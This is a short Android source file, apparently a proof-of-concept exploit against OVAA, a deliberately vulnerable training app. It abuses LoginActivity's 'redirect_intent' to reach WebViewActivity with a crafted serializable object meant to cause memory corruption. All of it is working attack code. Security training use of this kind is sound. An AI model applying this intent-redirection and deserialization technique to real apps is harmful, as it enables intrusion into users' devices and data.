package com.example.memoryserialization;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

import oversecured.ovaa.objects.MemoryCorruptionSerializable;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //MemoryCorruptionSerializable ms = new MemoryCorruptionSerializable();
        Intent second = new Intent();
        second.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");
        second.putExtra("url",new MemoryCorruptionSerializable(373592855));

        Intent intent = new Intent();
        intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
        intent.putExtra("redirect_intent",second);
        startActivity(intent);
        Thread.dumpStack();

    }
}
